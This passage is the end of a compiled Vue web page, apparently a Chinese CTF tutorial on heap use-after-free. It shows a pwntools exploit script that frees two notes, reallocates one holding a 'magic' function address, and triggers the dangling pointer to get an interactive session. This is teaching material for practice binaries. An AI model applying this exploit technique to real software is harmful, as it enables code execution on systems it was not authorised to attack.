    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">printnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;3&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment">#gdb.attach(r)</span>
magic <span class="token operator">=</span> <span class="token number">0x08048986</span>

addnote<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">&quot;aaaa&quot;</span><span class="token punctuation">)</span> <span class="token comment"># add note 0</span>
addnote<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">&quot;bbbb&quot;</span><span class="token punctuation">)</span> <span class="token comment"># add note 1</span>

delnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># delete note 0</span>
delnote<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># delete note 1</span>

addnote<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># add note 2</span>

printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># print note 0</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,22),e=[o];function c(i,u){return s(),a("div",null,e)}const r=n(p,[["render",c],["__file","pwn08-\u5806\u5229\u7528\u4E4Buaf.html.vue"]]);export{r as default};
